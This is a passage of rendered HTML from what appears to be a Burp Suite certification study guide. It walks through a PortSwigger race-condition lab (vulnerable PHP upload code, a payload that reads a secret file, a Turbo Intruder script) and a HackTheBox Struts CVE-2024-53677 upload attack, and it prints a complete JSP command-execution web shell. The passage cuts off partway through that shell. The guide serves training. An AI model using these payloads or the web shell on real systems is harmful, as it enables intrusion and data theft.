dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eRace Condition Web shell upload\u003c/h3\u003e\u003ca id=\"user-content-race-condition-web-shell-upload\" class=\"anchor\" aria-label=\"Permalink: Race Condition Web shell upload\" href=\"#race-condition-web-shell-upload\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eImage upload function \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e on profile page.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWhite box penetration test scenario, the vulnerable \u003cem\u003e\u003cstrong\u003esource code\u003c/strong\u003e\u003c/em\u003e that introduces this race condition is supplied by the client for the target:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-php notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?php\n$target_dir = \u0026quot;avatars/\u0026quot;;\n$target_file = $target_dir . $_FILES[\u0026quot;avatar\u0026quot;][\u0026quot;name\u0026quot;];\n\n// temporary move\nmove_uploaded_file($_FILES[\u0026quot;avatar\u0026quot;][\u0026quot;tmp_name\u0026quot;], $target_file);\n\nif (checkViruses($target_file) \u0026amp;\u0026amp; checkFileType($target_file)) {\n    echo \u0026quot;The file \u0026quot;. htmlspecialchars( $target_file). \u0026quot; has been uploaded.\u0026quot;;\n} else {\n    unlink($target_file);\n    echo \u0026quot;Sorry, there was an error uploading your file.\u0026quot;;\n    http_response_code(403);\n}\n\nfunction checkViruses($fileName) {\n    // checking for viruses\n    ...\n}\n\nfunction checkFileType($fileName) {\n    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));\n    if($imageFileType != \u0026quot;jpg\u0026quot; \u0026amp;\u0026amp; $imageFileType != \u0026quot;png\u0026quot;) {\n        echo \u0026quot;Sorry, only JPG \u0026amp; PNG files are allowed\\n\u0026quot;;\n        return false;\n    } else {\n        return true;\n    }\n}\n?\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003etarget_dir\u003c/span\u003e = \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eavatars/\u003c/span\u003e\"\u003c/span\u003e;\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003etarget_file\u003c/span\u003e = \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003etarget_dir\u003c/span\u003e . \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e_FILES\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eavatar\u003c/span\u003e\"\u003c/span\u003e][\u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003ename\u003c/span\u003e\"\u003c/span\u003e];\n\n\u003cspan class=\"pl-c\"\u003e// temporary move\u003c/span\u003e\n\u003cspan class=\"pl-en\"\u003emove_uploaded_file\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e_FILES\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eavatar\u003c/span\u003e\"\u003c/span\u003e][\u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003etmp_name\u003c/span\u003e\"\u003c/span\u003e], \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003etarget_file\u003c/span\u003e);\n\n\u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e (\u003cspan class=\"pl-en\"\u003echeckViruses\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003etarget_file\u003c/span\u003e) \u0026amp;\u0026amp; \u003cspan class=\"pl-en\"\u003echeckFileType\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003etarget_file\u003c/span\u003e)) {\n    \u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eThe file \u003c/span\u003e\"\u003c/span\u003e. \u003cspan class=\"pl-en\"\u003ehtmlspecialchars\u003c/span\u003e( \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003etarget_file\u003c/span\u003e). \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003e has been uploaded.\u003c/span\u003e\"\u003c/span\u003e;\n} \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e {\n    \u003cspan class=\"pl-en\"\u003eunlink\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003etarget_file\u003c/span\u003e);\n    \u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eSorry, there was an error uploading your file.\u003c/span\u003e\"\u003c/span\u003e;\n    \u003cspan class=\"pl-en\"\u003ehttp_response_code\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e403\u003c/span\u003e);\n}\n\n\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003echeckViruses\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003efileName\u003c/span\u003e) {\n    \u003cspan class=\"pl-c\"\u003e// checking for viruses\u003c/span\u003e\n    \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n}\n\n\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003echeckFileType\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003efileName\u003c/span\u003e) {\n    \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003eimageFileType\u003c/span\u003e = \u003cspan class=\"pl-en\"\u003estrtolower\u003c/span\u003e(\u003cspan class=\"pl-en\"\u003epathinfo\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003efileName\u003c/span\u003e,\u003cspan class=\"pl-c1\"\u003ePATHINFO_EXTENSION\u003c/span\u003e));\n    \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003eimageFileType\u003c/span\u003e != \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003ejpg\u003c/span\u003e\"\u003c/span\u003e \u0026amp;\u0026amp; \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003eimageFileType\u003c/span\u003e != \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003epng\u003c/span\u003e\"\u003c/span\u003e) {\n        \u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"\u003cspan class=\"pl-s\"\u003eSorry, only JPG \u0026amp; PNG files are allowed\u003c/span\u003e\\n\"\u003c/span\u003e;\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003efalse\u003c/span\u003e;\n    } \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etrue\u003c/span\u003e;\n    }\n}\n\u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePHP Payload to read the secret data \u003ccode\u003e\u0026lt;?php echo file_get_contents('/home/carlos/secret'); ?\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRight-click on the failed upload \u003ccode\u003ePOST /my-account/avatar\u003c/code\u003e request that was used to submit the PHP Payload file upload and select \u003cem\u003e\u003cstrong\u003eExtensions \u0026gt; Turbo Intruder \u0026gt; Send to turbo intruder.\u003c/strong\u003e\u003c/em\u003e\nThe Turbo Intruder window opens. Copy and paste the following race condition inducing script template into Turbo Intruder's Python editor:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/race-condition-turbo-intruder.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/race-condition-turbo-intruder.png\" alt=\"race-condition-turbo-intruder\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRace script template into Turbo Intruder's Python editor:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)\n\n    request1 = '''\u0026lt;YOUR-POST-REQUEST POST /my-account/avatar HTTP/2 filename=\u0026quot;read-secret.php\u0026quot;'''\n\n    request2 = '''\u0026lt;YOUR-GET-REQUEST\u0026gt; GET /files/avatars/read-secret.php HTTP/2'''\n\n    # the 'gate' argument blocks the final byte of each request until openGate is invoked\n    engine.queue(request1, gate='race1')\n    for x in range(5):\n        engine.queue(request2, gate='race1')\n\n    # wait until every 'race1' tagged request is ready\n    # then send the final byte of each request\n    # (this method is non-blocking, just like queue)\n    engine.openGate('race1')\n\n    engine.complete(timeout=60)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003equeueRequests\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ewordlists\u003c/span\u003e):\n    \u003cspan class=\"pl-s1\"\u003eengine\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eRequestEngine\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eendpoint\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003etarget\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eendpoint\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003econcurrentConnections\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e10\u003c/span\u003e,)\n\n    \u003cspan class=\"pl-s1\"\u003erequest1\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'''\u0026lt;YOUR-POST-REQUEST POST /my-account/avatar HTTP/2 filename=\"read-secret.php\"'''\u003c/span\u003e\n\n    \u003cspan class=\"pl-s1\"\u003erequest2\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'''\u0026lt;YOUR-GET-REQUEST\u0026gt; GET /files/avatars/read-secret.php HTTP/2'''\u003c/span\u003e\n\n    \u003cspan class=\"pl-c\"\u003e# the 'gate' argument blocks the final byte of each request until openGate is invoked\u003c/span\u003e\n    \u003cspan class=\"pl-s1\"\u003eengine\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003equeue\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003erequest1\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003egate\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'race1'\u003c/span\u003e)\n    \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ex\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-en\"\u003erange\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e5\u003c/span\u003e):\n        \u003cspan class=\"pl-s1\"\u003eengine\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003equeue\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003erequest2\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003egate\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'race1'\u003c/span\u003e)\n\n    \u003cspan class=\"pl-c\"\u003e# wait until every 'race1' tagged request is ready\u003c/span\u003e\n    \u003cspan class=\"pl-c\"\u003e# then send the final byte of each request\u003c/span\u003e\n    \u003cspan class=\"pl-c\"\u003e# (this method is non-blocking, just like queue)\u003c/span\u003e\n    \u003cspan class=\"pl-s1\"\u003eengine\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eopenGate\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'race1'\u003c/span\u003e)\n\n    \u003cspan class=\"pl-s1\"\u003eengine\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecomplete\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etimeout\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e60\u003c/span\u003e)\n\n\n\u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehandleResponse\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ereq\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003einteresting\u003c/span\u003e):\n    \u003cspan class=\"pl-s1\"\u003etable\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eadd\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ereq\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eresults list, notice that some of the GET requests received a 200 response containing Carlos's secret.\u003cbr\u003e\n\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/race-condition-read-secret.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/race-condition-read-secret.png\" alt=\"race-condition-read-secret.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition\" rel=\"nofollow\"\u003ePortSwigger Lab: Web shell upload via race condition\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eWebShell JSP File Upload\u003c/h3\u003e\u003ca id=\"user-content-webshell-jsp-file-upload\" class=\"anchor\" aria-label=\"Permalink: WebShell JSP File Upload\" href=\"#webshell-jsp-file-upload\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget \u003ccode\u003estrutted.htb\u003c/code\u003e HackTheBox Lab machine restricted file upload only allows image files.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eEnumaration of a downloaded ZIP source code backup, identify CVE-2024-53677\nFile upload logic in Apache Struts is flawed.\nAttacker can manipulate file upload to enable paths traversal and be used to perform Remote Code Execution.\nCVE-2024-53677 issue affects Apache Struts from 2.0.0 before 6.4.0.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe attack path is to emb a malicious JSP file into the contents of an image.\u003cbr\u003e\nThe OGNL parameter abuse to change the name of the file to a JSP file which will let us trigger payloads.\nWe grab this payload from a similar disclosure, and copy the shell.jsp contents below the image header in our POST request.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSource of \u003ca href=\"https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp\" rel=\"nofollow\"\u003eJavaScript webshell.JSP\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-jsp notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;%@ page import=\u0026quot;java.util.*,java.io.*\u0026quot;%\u0026gt;\n\u0026lt;%\n//\n// JSP_KIT\n//\n// cmd.jsp = Command Execution (unix)\n//\n// by: Unknown\n// modified: 27/06/2003\n//\n%\u0026gt;\n\u0026lt;HTML\u0026gt;\u0026lt;BODY\u0026gt;\n\u0026lt;FORM METHOD=\u0026quot;GET\u0026quot; NAME=\u0026quot;myform\u0026quot; ACTION=\u0026quot;\u0026quot;\u0026gt;\n\u0026lt;INPUT TYPE=\u0026quot;text\u0026quot; NAME=\u0026quot;cmd\u0026quot;\u0026gt;\n\u0026lt;INPUT TYPE=\u0026quot;submit\u0026quot; VALUE=\u0026quot;Send\u0026quot;\u0026gt;\n\u0026lt;/FORM\u0026gt;\n\u0026lt;pre\u0026gt;\n\u0026lt;%\nif (request.getParameter(\u0026quot;cmd\u0026quot;) != null) {\n        out.println(\u0026quot;Command: \u0026quot; + request.getParameter(\u0026quot;cmd\u0026quot;) + \u0026quot;\u0026lt;BR\u0026gt;\u0026quot;);\n        Process p = Runtime.getRuntime().exec(request.getParameter(\u0026quot;cmd\u0026quot;));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n                out.println(disr); \n                disr = dis.readLine(); \n                }\n        }\n%\u0026gt;\n\u0026lt;/pre\u0026gt;\n\u0026lt;/BODY\u0026gt;\u0026lt;/HTML\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;%@ \u003cspan class=\"pl-k\"\u003epage\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eimport\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ejava.util.*,java.io.*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e%\u0026gt;\n\u003cspan class=\"pl-pse\"\u003e\u0026lt;%\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e//\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e//\u003c/span\u003e JSP_KIT\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e//\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e//\u003c/span\u003e cmd.jsp = Command Execution (unix)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e//\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e//\u003c/span\u003e by: Unknown\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e//\u003c/span\u003e modified: 27/06/2003\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e//\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e\u003cspan class=\"pl-s1\"\u003e%\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u0026lt;\u003cspan class=\"pl-ent\"\u003eHTML\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan class=\"pl-ent\"\u003eBODY\u003c/span\u003e\u0026gt;\n\u0026lt;\u003cspan class=\"pl-ent\"\u003eFORM\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eMETHOD\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGET\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eNAME\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003emyform\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eACTION\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n\u0026lt;\u003cspan class=\"pl-ent\"\u003eINPUT\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eTYPE\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003etext\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eNAME\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecmd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n\u0026lt;\u003cspan class=\"pl-ent\"\u003eINPUT\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eTYPE\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esubmit\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eVALUE\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSend\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003eFORM\u003c/span\u003e\u0026gt;\n\u0026lt;\u003cspan class=\"pl-ent\"\u003epre\u003c/span\u003e\u0026gt;\n\u003cspan class=\"pl-pse\"\u003e\u0026lt;%\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e (request\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003egetParameter(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecmd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003e!=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003enull\u003c/span\u003e) {\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e        out\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003eprintln(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eCommand: \u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e request\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003egetParameter(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecmd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u0026lt;BR\u0026gt;\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e);\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e        \u003cspan class=\"pl-smi\"\u003eProcess\u003c/span\u003e p \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eRuntime\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003egetRuntime()\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003eexec(request\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003egetParameter(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecmd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e));\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e        \u003cspan class=\"pl-smi\"\u003eOutputStream\u003c/span\u003e os \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e p\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003egetOutputStream();\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e        \u003cspan class=\"pl-smi\"\u003eInputStream\u003c/span\u003e in \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e p\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003egetInputStream();\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e        \u003cspan class=\"pl-smi\"\u003eDataInputStream\u003c/span\u003e dis \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003enew\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eDataInputStream\u003c/span\u003e(in);\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e        \u003cspan class=\"pl-smi\"\u003eString\u003c/span\u003e disr \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e dis\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003ereadLine();\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003e        \u003cspan class=\"pl-k\"\u003ewhile\u003c/span\u003e ( disr 